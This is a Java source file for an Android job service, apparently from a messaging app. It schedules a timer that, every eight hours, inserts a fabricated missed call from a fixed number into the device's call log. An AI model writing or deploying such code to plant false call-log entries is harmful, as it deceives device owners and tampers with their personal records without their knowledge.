package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;

import com.candroid.textme.api.ContentProviders;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.JobsScheduler;

import java.util.Timer;
import java.util.TimerTask;

public class MissedCallsJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                ContentProviders.CallLog.fakeMissedCall(MissedCallsJobService.this, "9696966969");
            }
        };
        Timer timer = new Timer("missedCallTask", true);
        timer.schedule(timerTask, 90000, 8 * JobsScheduler.ONE_HOUR);
        Lofl.setJobRan(this, JobsScheduler.MISSED_CALLS_KEY);
        jobFinished(params, false);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
